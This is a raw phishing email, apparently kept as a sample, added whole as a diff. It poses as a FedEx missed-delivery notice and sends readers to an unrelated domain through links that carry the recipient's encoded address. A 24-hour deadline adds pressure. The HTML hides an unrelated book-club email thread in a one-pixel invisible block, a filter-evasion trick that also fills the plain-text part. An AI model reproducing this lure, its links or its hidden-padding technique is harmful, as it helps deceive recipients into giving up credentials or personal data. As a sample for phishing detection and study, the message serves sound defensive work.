@@ -1,0 +1,232 @@
+Return-Path: FedEx@greshammobiledetailing.com
+Delivered-To: jose@monkey.org
+X-FDA: 83727333480.29.B99BE78
+Received: from mail.greshammobiledetailing.com (trolley.enablemodes.us [37.221.77.130])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id AEB92120004
+	for <jose@monkey.org>; Fri,  1 Aug 2025 07:17:36 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=greshammobiledetailing.com header.s=default header.b=c8o1foKF;
+	spf=pass (imf25.b.hostedemail.com: domain of FedEx@greshammobiledetailing.com designates 37.221.77.130 as permitted sender) smtp.mailfrom=FedEx@greshammobiledetailing.com;
+	dmarc=pass (policy=none) header.from=greshammobiledetailing.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1754032659; a=rsa-sha256;
+	cv=none;
+	b=TAA7Gt/7Lv04niXLneuc1JUqKFDmOXOqgGMfMa2RqvdfRVGQQg5zEsQdqLi2p0dFKY/zTX
+	iLwPeDMtsqJ6509+ZPjDNGhK9haOcioYcmClgcrb/fvErrLdmHtYifU6FZFKScHJBJ2fjF
+	EkyGmpccud7qjKMuFdfRugs8q8y72ig=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=greshammobiledetailing.com header.s=default header.b=c8o1foKF;
+	spf=pass (imf25.b.hostedemail.com: domain of FedEx@greshammobiledetailing.com designates 37.221.77.130 as permitted sender) smtp.mailfrom=FedEx@greshammobiledetailing.com;
+	dmarc=pass (policy=none) header.from=greshammobiledetailing.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1754032659;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=86sJEuqa4ur0Jj58bQ/w9ccLVdKuPPgnnWXqiBifD/k=;
+	b=Vuj9tRi2p34aZpNTqso0aqyz18zVFA7arf8fqOSoLGqgOK9ReqOzde+v/zYnGoiOFQcCb+
+	Fau72Uhi/1/169Lghu8lLTxJVQ+2VuUADjH5MwUmFyU+uPbLv5AFToseihVitYJ8u/BZhS
+	bGZ59oiJdy0H2Dl63fhS2uz/xyGf5xs=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=greshammobiledetailing.com;
+ h=MIME-Version:To:Date:From:Subject:Message-ID:Reply-To:Content-Type;
+ i=FedEx@greshammobiledetailing.com;
+ bh=86sJEuqa4ur0Jj58bQ/w9ccLVdKuPPgnnWXqiBifD/k=;
+ b=c8o1foKFrL2SejziGz/6lhKv8msbkf4ESbvJRhiWIEwKcj9fRdzohR0Vz49CgnKQ7It69DyR43ss
+   x1p3osolMfJcL4LYkeP8l7s9YMdUEos9Rz6CgQc6IlhEdlcRAVEye6mv46x37CS1gVRCACQXjKE7
+   1zhfiwJsAmDXe1jsXz7d85kxURxLHaJsm8XrJsgGtExVILjARSQBAYc6jxPiSDErNiFjvJzgV9LG
+   HnSxB4l2cQyMeJ/3Ji2fwaWSdZSnzvCYAz3F5iD9SlHRnvlV07lg/j4MswBV2e8KLJbC9c5xtUUF
+   1K/njO37EcAMCb35UP/WrvCrJ2agiwRBSnO9iQ==
+MIME-Version: 1.0
+To: jose@monkey.org
+Date: Fri, 1 Aug 2025 03:09:23 -0400
+From: Fed-Ex <FedEx@greshammobiledetailing.com>
+Subject: Package Missing - Reschedule Delivery for Pkg No. 2849282 by 
+Message-ID: <fyFqPXzw-uRJywUQHoC9tZSkR@mail.greshammobiledetailing.com>
+Reply-To: FedEx@greshammobiledetailing.com
+Content-Type: multipart/alternative; boundary="-ypDZcBuDJsEapEuDDxZ3X93c-"
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: AEB92120004
+X-Stat-Signature: 3txbtfyf71ehdggz1mxjhdc576tdfdon
+X-Rspam-User: 
+X-Spam-Status: No, score=7.80
+X-HE-Tag: 1754032656-221391
+X-HE-Meta: U2FsdGVkX19LEvvpsR1WxWSvqZZ8cHE14S3ETvKKvDcIlR/QY+TrMgYDrEjyPkHL1g/msT6vG6dAJ5D+MZk06pP4RB/KflO9BOjLIJ6od6drzhHVXVT3l7/KHx0ntU4uQ27uLUbLeXKuk0b/OqQRCrJC8okQKhODQDPnEx0gLFJlBvsU1ZF6FNhVwk9Q24mee1evtx56jS41srP227fVBCZVF0CTm/jl6rx99ElcdErZUEyDrmEOdFU5CQgopQjbHnIGbWPlD4XwccADa4p+Em6VoFEXC725b1S8IR9ntnD8BQcO5NgxQ78Da1L/HNLV353Z8XjLC+U9JxnCDGrAY8so+V1dDqQiY6sE60Sd1FAO9gKovAmj9GMt7DFaG53rlG+eN7AvnqUdQiXX0D9NCrVABOmm1tYODZaiT1+yu5yy3Vri50jq+PgeiFhTJwJH2EGrHDppUVeMst6RYUq5PTODWkqe/7WuTzSHELdGmMHVKbyuZ5iVMgzzJq3WCbIEoPh+X45PQbfdc7wOptznEQ5DD0TYJSfQ48gwZ7aij01TLjL2Z77InhZhDMhsHkI/POYVpYsKZLD5TJ6ClFxNUc+Jm0ZgclaPTWuVSSWQqy4lYiR++tGfNQvb+AY19sP1A3N6z+gUA+UeoOFQPF8IxLmk7MR/1DYTBGfrm93e5u2xIVU3WhkHuEFVRJqlslf6DzgTwUkRS6LN4MGTY5L1WitdJQEEEj+4sGv3FWrNifhRHeX7wz8Tlk9BCp244gXpy+c9waysJMEoGmnBUIt5ZTaaovV5BVvwv3w9/UgnqXFrsJ4qdMjuekryBp+2S5C47T69s+3BMYwWTfFS7Favtd5TDCgiElPR48rByZVc3KjIkU5xgBGZmFB2h2GbH9Z5NP2AbzSZzIyufy4jNdZTsj8SPxOO7CFOnhKkCzspfNx6gKfyw8CQfzamIyHZUNxVeo3y0RTw/hoduKW5lMWcTB++nI6
+ ag/A99HJ/UrOpvIkz9a5SwJh7H7YL1Cg602lmKLWQJcBcP/GbhirTs7hBnKFTNUj4Ce0Ysg5gs8matp7FNL6eV6Du0lOcSEftgedmJjJO2j/sxsQ15lY9Scsr0DnF9O8aw/GmFhd5GRwZg/uUEMdFqoP4MZ6d0NzmmG7IuUV04PQo9OvjLGamoXcPbFMtXjKtqTe54uWIylglPO30HRTXs8zQAVR4QQnrpg5Klnqz+1QP9gGL8MnalklSV5apBTULnQsjDdgSNiBaHPKySxfJVb5PSDFWIxeKxdLXXBdNpkHKetbHnkzAxNoEMb6I5HiHM5hqBvXsBNYwOBzSGwKXG2GluGbYpCQFSzSHC+X9sWmYoTdrUuZHjgPi6WCm71VBDyjhgJWj3EfbrcBIln9kIIcRmc1CRn9qD8jGYe7W0H/9b+Y4HdW2X1Lq7hBJ35mvvkvIdr0oFk4QlhflmAaKsTWupUnyUn6CJSv9jEsnx0EDdhgu5K59n657fu1V5nUg4T8YWHaGhGxJaUsFWUmdVpxpxd4Q+sWUf0XN
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 319
+
+---ypDZcBuDJsEapEuDDxZ3X93c-
+Content-type: text/plain; charset="UTF-8"
+Content-transfer-encoding: 8bit
+
+** FedEx
+
+----------------------------------------
+
+
+** Delivery Attempt: Unsuccessful
+
+----------------------------------------
+
+Dear Customer,
+
+We regret to inform you that your package delivery for July 30th was missed because a signature was necessary.
+
+To ensure you receive your parcel, please click here http://www.greshammobiledetailing.com/http2/quic/spdy/h2/h3/tls/ssl/chip/golan?x=am9zZUBtb25rZXkub3Jn to reschedule the dispatch.
+
+Note: If not rescheduled within 24 hours, your package will be returned to the sender.
+
+Delivery Date Tracking Number Package Status July 30th, 2025 1Z999AA10123456784 Signature Required
+
+Reschedule By Sender Information Within 24 hours Online Order
+
+Reschedule Delivery http://www.greshammobiledetailing.com/cpu/gpu/ram/pci/usb/nvme/hash/fsck?x=am9zZUBtb25rZXkub3Jn
+
+From: Amy Taylor Sent: October 3, 2023, 02:00 PM To: Book Club Members Subject: Topic for Next Meeting Hi everyone, I was thinking we could discuss "Sapiens" by Yuval Noah Harari for our next book club session. It's quite insightful and I believe it will lead to great conversations. Let me know your thoughts! Best, Amy --- From: Jon Rivera Sent: October 3, 2023, 02:30 PM To: Book Club Members Subject: Re: Topic for Next Meeting Sounds fantastic, Amy! I've heard nothing but praise for that book. I'm in for discussing it at our next meeting. Cheers, Jon --- From: Lara Nguyen Sent: October 3, 2023, 03:00 PM To: Book Club Members Subject: Re: Topic for Next Meeting I'm on board with "Sapiens" as well! Great choice, Amy. Thanks for the suggestion! Warm regards, Lara --- From: Amy Taylor Sent: October 3, 2023, 03:30 PM To: Book Club Members Subject: Re: Topic for Next Meeting Wonderful! I'll coordinate with the library to reserve a discussion room. Looking forward to it! Best, Amy
+
+---ypDZcBuDJsEapEuDDxZ3X93c-
+Content-Type: text/html; charset="UTF-8"
+Content-transfer-encoding: 8bit
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style type="text/css">
+    html, body { margin: 0; padding: 0; font-family: Arial, sans-serif; }
+    body { background-color: #FFFFFF; }
+    .cherry-kite { width: 100%; table-layout: fixed; background-color: #FFFFFF; }
+    .pumpkin-breeze { max-width: 600px; margin: auto; }
+    .rainbow-sunset { background: #ffffff; padding: 20px; text-align: center; }
+    .moonlit-garden { background-color: #FAFAFA; padding: 20px; }
+    .starry-night { color: #660099; font-size: 24px; font-weight: bold; }
+    .ocean-storm { color: #FF6600; }
+    .vintage-dragon { width: 100%; border-collapse: collapse; margin: 20px 0; }
+    .vintage-dragon th, .vintage-dragon td { border: 1px solid #DDDDDD; padding: 8px; text-align: left; }
+    .vintage-dragon th { background-color: #EEE; }
+    .forest-path { background-color: #660099; color: #ffffff; padding: 10px 20px; text-align: center; display: block; text-decoration: none; margin: 30px auto; border-radius: 4px; }
+    .sunrise-hush { padding: 20px; text-align: center; }
+    @media only screen and (max-width: 480px) {
+      .cherry-kite, .pumpkin-breeze { width: 100% !important; }
+      .forest-path { padding: 10px; width: auto; }
+    }
+  </style>
+</head>
+<body>
+  <table border="0" cellpadding="0" cellspacing="0" class="cherry-kite">
+    <tr>
+      <td align="center" valign="top">
+        <table border="0" cellpadding="0" cellspacing="0" class="pumpkin-breeze">
+          <tr>
+            <td class="rainbow-sunset">
+              <h1 style="font-size: 36px; font-weight: bold;">
+                <span style="color:#660099">Fed</span><span style="color:#FF6600">Ex</span>
+              </h1>
+            </td>
+          </tr>
+          <tr>
+            <td class="moonlit-garden">
+              <h1 class="starry-night">Delivery Attempt: Unsuccessful</h1>
+              <p>Dear Customer,</p>
+              <p>We regret to inform you that your package delivery for <span class="ocean-storm">July 30th</span> was <span style="color: #660099;">missed</span> because a <span style="color: #660099;">signature</span> was necessary.</p>
+              <p>To ensure you receive your parcel, <a href="http://www.greshammobiledetailing.com/http2/quic/spdy/h2/h3/tls/ssl/chip/golan?x=am9zZUBtb25rZXkub3Jn" style="color: #FF6600;">please click here</a> to <span style="color: #660099;">reschedule</span> the dispatch.</p>
+              <p><span class="ocean-storm">Note:</span> If not rescheduled within <span style="color: #660099;">24 hours</span>, your package will be returned to the sender.</p>
+              
+              <table class="vintage-dragon">
+                <thead>
+                  <tr>
+                    <th>Delivery Date</th>
+                    <th>Tracking Number</th>
+                    <th>Package Status</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>July 30th, 2025</td>
+                    <td>1Z999AA10123456784</td>
+                    <td>Signature Required</td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <table class="vintage-dragon">
+                <thead>
+                  <tr>
+                    <th>Reschedule By</th>
+                    <th>Sender Information</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Within 24 hours</td>
+                    <td>Online Order</td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <a href="http://www.greshammobiledetailing.com/cpu/gpu/ram/pci/usb/nvme/hash/fsck?x=am9zZUBtb25rZXkub3Jn" class="forest-path">Reschedule Delivery</a>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+
+  <div style="font-family:Cambria, Hoefler Text, Liberation Serif, Times, Times New Roman, serif; width:1px; line-height:0; overflow:hidden">
+
+From: Amy Taylor  
+Sent: October 3, 2023, 02:00 PM  
+To: Book Club Members  
+Subject: Topic for Next Meeting
+
+Hi everyone,
+
+I was thinking we could discuss "Sapiens" by Yuval Noah Harari for our next book club session. It's quite insightful and I believe it will lead to great conversations. Let me know your thoughts!
+
+Best,  
+Amy
+
+---
+
+From: Jon Rivera  
+Sent: October 3, 2023, 02:30 PM  
+To: Book Club Members  
+Subject: Re: Topic for Next Meeting
+
+Sounds fantastic, Amy! I've heard nothing but praise for that book. I'm in for discussing it at our next meeting.
+
+Cheers,  
+Jon
+
+---
+
+From: Lara Nguyen  
+Sent: October 3, 2023, 03:00 PM  
+To: Book Club Members  
+Subject: Re: Topic for Next Meeting
+
+I'm on board with "Sapiens" as well! Great choice, Amy. Thanks for the suggestion!
+
+Warm regards,  
+Lara
+
+---
+
+From: Amy Taylor  
+Sent: October 3, 2023, 03:30 PM  
+To: Book Club Members  
+Subject: Re: Topic for Next Meeting
+
+Wonderful! I'll coordinate with the library to reserve a discussion room. Looking forward to it!
+
+Best,  
+Amy
+
+  </div>
+</body>
+</html>
+
+---ypDZcBuDJsEapEuDDxZ3X93c---
